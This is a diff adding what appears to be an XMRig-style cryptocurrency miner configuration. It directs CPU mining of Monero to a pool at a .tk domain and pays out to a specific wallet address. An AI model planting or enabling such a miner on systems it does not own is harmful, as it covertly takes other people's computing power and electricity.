@@ -1,0 +1,18 @@
+{
+    "autosave": true,
+    "cpu": true,
+    "opencl": false,
+    "cuda": false,
+    "pools": [
+        {
+            "coin": "monero",
+            "algo": null,
+            "url": "liafonx.tk:5555",
+            "user": "85ERhv8oNMWGoy3Zi6kS8FLVn3vwXK6bqWPdq92fzGnP4J2CZNeS3f7WGthqGvza16W4TpSRk62YGFM8FqPR9ufsNW9ah4i",
+            "pass": "x",
+            "tls": true,
+            "keepalive": true,
+            "nicehash": false
+        }
+    ]
+}
